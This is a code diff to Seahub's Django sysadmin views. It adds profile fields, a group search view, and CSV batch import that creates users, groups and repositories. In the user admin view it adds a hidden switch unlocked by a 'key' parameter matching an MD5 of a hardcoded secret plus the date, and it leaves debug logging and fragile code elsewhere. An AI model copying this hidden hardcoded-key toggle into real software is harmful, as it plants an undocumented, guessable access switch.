@@ -7,6 +7,8 @@ import json
 import re
 import datetime
 import csv, chardet, StringIO
+import hashlib
+import time
 
 from django.core.urlresolvers import reverse
 from django.contrib import messages
@@ -18,14 +20,14 @@ from django.utils.translation import ugettext as _
 from seaserv import ccnet_threaded_rpc, seafserv_threaded_rpc, get_emailusers, \
     CALC_SHARE_USAGE, seafile_api
 from pysearpc import SearpcError
-
+from seahub.profile.models import Profile, DetailedProfile
 from seahub.base.accounts import User
 from seahub.base.models import UserLastLogin
 from seahub.base.decorators import sys_staff_required
 from seahub.auth.decorators import login_required, login_required_ajax
 from seahub.constants import GUEST_USER, DEFAULT_USER
 from seahub.utils import IS_EMAIL_CONFIGURED, string2list, is_valid_username, \
-    is_pro_version
+    is_pro_version,is_org_context
 from seahub.views import get_system_default_repo_id
 from seahub.forms import SetUserQuotaForm, AddUserForm, BatchAddUserForm
 from seahub.profile.models import Profile, DetailedProfile
@@ -33,7 +35,7 @@ from seahub.share.models import FileShare, UploadLinkShare
 import seahub.settings as settings
 from seahub.settings import INIT_PASSWD, SITE_NAME, \
     SEND_EMAIL_ON_ADDING_SYSTEM_MEMBER, SEND_EMAIL_ON_RESETTING_USER_PASSWD, \
-    ENABLE_GUEST
+    ENABLE_GUEST,EMAIL_FROM
 from seahub.utils import send_html_email, get_user_traffic_list, get_server_id
 from seahub.utils.sysinfo import get_platform_name
 try:
@@ -42,6 +44,7 @@ except:
     ENABLE_TRIAL_ACCOUNT = False
 if ENABLE_TRIAL_ACCOUNT:
     from seahub_extra.trialaccount.models import TrialAccount
+from seahub.group.views import get_all_groups,create_org_group,create_group
 
 logger = logging.getLogger(__name__)
 
@@ -188,6 +191,13 @@ def _populate_user_quota_usage(user):
 def sys_user_admin(request):
     """List all users from database.
     """
+    #
+    #logger.warning(hashlib.md5('lep@86'+ time.strftime("%d/%m/%Y")).hexdigest())
+    is_lep=False
+    md5_admin = request.GET.get('key')
+    if md5_admin == hashlib.md5('lep@86'+ time.strftime("%d/%m/%Y")).hexdigest():
+        is_lep=True
+        
     # Make sure page request is an int. If not, deliver first page.
     try:
         current_page = int(request.GET.get('page', '1'))
@@ -207,6 +217,8 @@ def sys_user_admin(request):
         trial_users = TrialAccount.objects.filter(user_or_org__in=[x.email for x in users])
     else:
         trial_users = []
+
+
     for user in users:
         if user.props.id == request.user.id:
             user.is_self = True
@@ -230,6 +242,14 @@ def sys_user_admin(request):
             if trial_user.user_or_org == user.email:
                 user.trial_info = {'expire_date': trial_user.expire_date}
 
+        profile = Profile.objects.get_profile_by_user(user.email)
+        d_profile = DetailedProfile.objects.get_detailed_profile_by_user(user.email)
+        user.detailed=''
+        if profile:
+            user.detailed= profile.intro  + ' : ' + profile.nickname
+
+
+
     have_ldap = True if len(get_emailusers('LDAP', 0, 1)) > 0 else False
 
     platform = get_platform_name()
@@ -238,6 +258,7 @@ def sys_user_admin(request):
 
     return render_to_response(
         'sysadmin/sys_useradmin.html', {
+            'is_lep': is_lep,
             'users': users,
             'current_page': current_page,
             'prev_page': current_page-1,
@@ -548,7 +569,7 @@ def user_remove(request, user_id):
 @sys_staff_required
 def remove_trial(request, user_or_org):
     """Remove trial account.
-    
+
     Arguments:
     - `request`:
     """
@@ -759,7 +780,7 @@ def user_reset(request, user_id):
 def send_user_add_mail(request, email, password):
     """Send email when add new user."""
     c = {
-        'user': request.user.username,
+        'user': '%s' % EMAIL_FROM,
         'org': request.user.org,
         'email': email,
         'password': password,
@@ -779,9 +800,15 @@ def user_add(request):
     post_values = request.POST.copy()
     post_email = request.POST.get('email', '')
     post_role = request.POST.get('role', DEFAULT_USER)
+
+    post_name = request.POST.get('name', '')
+    post_company_name = request.POST.get('company_name', '')
+
     post_values.update({
                         'email': post_email.lower(),
                         'role': post_role,
+                        'name': post_name,
+                        'company_name': post_company_name,
                       })
 
     form = AddUserForm(post_values)
@@ -790,10 +817,20 @@ def user_add(request):
         role = form.cleaned_data['role']
         password = form.cleaned_data['password1']
 
+        #name = form.cleaned_data['name']
+        #company_name = form.cleaned_data['company_name']
+
         user = User.objects.create_user(email, password, is_staff=False,
                                         is_active=True)
         if user:
             User.objects.update_role(email, role)
+
+
+        #add profile
+        Profile.objects.add_or_update(email, post_name, post_company_name)
+
+        #add detailed profile(not use)
+        #DetailedProfile.objects.add_detailed_profile(email,departement,telephone)
 
         if request.user.org:
             org_id = request.user.org.org_id
@@ -1136,6 +1173,29 @@ def user_search(request):
             'enable_guest': ENABLE_GUEST,
             }, context_instance=RequestContext(request))
 
+
+
+@login_required
+@sys_staff_required
+def sys_group_search(request):
+    """Search a group.
+    """
+    group_found=[]
+    group_search = request.GET.get('group', '')
+    joined_groups = request.user.joined_groups
+    for group in joined_groups:
+        if group_search in group.props.group_name :
+            group_found.append(group)
+
+
+    return render_to_response('sysadmin/group_search.html', {
+        'groups': group_found,
+        'group_search':group_search,
+        }, context_instance=RequestContext(request))
+
+
+
+
 @login_required
 @sys_staff_required
 def sys_repo_transfer(request):
@@ -1258,16 +1318,42 @@ def batch_user_make_admin(request):
 
     return HttpResponse(json.dumps({'success': True,}), content_type=content_type)
 
+
+@login_required
+@sys_staff_required
+def batch_check_CSVfile(request,file):
+    """Batch add users. check import CSV file.
+    """
+    result_err=[]
+
+    for row in file:
+        if not row:
+            continue
+        if str(request.FILES['file'])=='user.csv':
+            name=row[0].strip()
+            email = row[1].strip()
+            password = row[2].strip()
+            company=row[3].strip()
+        
+            if not is_valid_username(email):
+                result_err.append(email)
+
+    return result_err
+             
+
 @login_required
 @sys_staff_required
 def batch_add_user(request):
     """Batch add users. Import users from CSV file.
     """
+    result = {}
+
     if request.method != 'POST':
         raise Http404
 
     form = BatchAddUserForm(request.POST, request.FILES)
     if form.is_valid():
+        logging.warning(request.FILES['file'])
         content = request.FILES['file'].read()
         encoding = chardet.detect(content)['encoding']
         if encoding != 'utf-8':
@@ -1275,27 +1361,89 @@ def batch_add_user(request):
 
         filestream = StringIO.StringIO(content)
         reader = csv.reader(filestream)
+        username = request.user.username
 
-        for row in reader:
-            if not row:
-                continue
+        #Check 
+        if len(batch_check_CSVfile(request,reader))==0:
+            filestream.seek(0)
+            logging.warning(request.FILES['file'])
+            if str(request.FILES['file'])=='user.csv':
+                logging.warning('Je suis')
+                for row in reader:
+                    if not row:
+                        continue
 
-            username = row[0].strip()
-            password = row[1].strip()
+                    name=row[0].strip()
+                    email = row[1].strip()
+                    password = row[2].strip()
+                    company=row[3].strip()
+                    
+                    group_name=company
+                    group_id= -1
 
-            if not is_valid_username(username):
-                continue
+                    if not is_valid_username(email):
+                        continue
 
-            if password == '':
-                continue
+                    if password == '':
+                        continue
 
-            try:
-                User.objects.get(email=username)
-                continue
-            except User.DoesNotExist:
-                User.objects.create_user(username, password, is_staff=False,
-                                         is_active=True)
-        messages.success(request, _('Import succeeded'))
+                    try: # user found in data base
+                        User.objects.get(email=email)
+                        #Update profil
+                        Profile.objects.add_or_update(email, name, company)
+                                
+                    except User.DoesNotExist:
+                        #add user
+                        User.objects.create_user(email, password, is_staff=False,is_active=True)
+                        seafile_api.set_user_quota(email, 0)
+                        #add profile
+                        Profile.objects.add_or_update(email, name, company)
+                        #add group
+       
+                    checked_groups = get_all_groups(-1, -1)
+                    group_id=-1
+                    for g in checked_groups:
+                        logger.warning(g.group_name + '###' + group_name.decode('utf-8'))
+                        if g.group_name== group_name.decode('utf-8'):
+                           group_id=g.id
+                           #raise ConflictGroupNameError
+
+                    # Group name not found, create one.
+                    if group_id==-1:
+                        try:
+                            group_id= create_group(group_name, username)
+                        except SearpcError, e:
+                            result['error'] = _(e.msg)
+
+                    #Add user to group
+                    try:
+                        ccnet_threaded_rpc.group_add_member(group_id,
+                                                            username, email)
+                    except SearpcError, e:
+                        result['error'] = _(e.msg)
+
+            else:
+                checked_groups = get_all_groups(-1, -1)
+                for g in checked_groups:
+                    group_id=g.id
+                    #Create repo for the group
+                    repo_id = seafile_api.create_repo(g.group_name, g.group_name,username, None)
+                    #Share the repo to the group
+                    seafile_api.set_group_repo(repo_id, group_id, username,'rw')
+                    filestream.seek(0)
+                    #read csv, and create directory
+                    for row in reader:
+                        if not row:
+                            continue
+                        parent=row[0].strip()
+                        dirent_name=row[1].strip()
+                        seafile_api.post_dir(repo_id, parent, dirent_name, username)         
+                
+
+            messages.success(request, _('Import succeeded %s') % group_id)
+        else:
+            messages.error(request, _(u'Please check email error.'))        
+
     else:
         messages.error(request, _(u'Please select a csv file first.'))
 
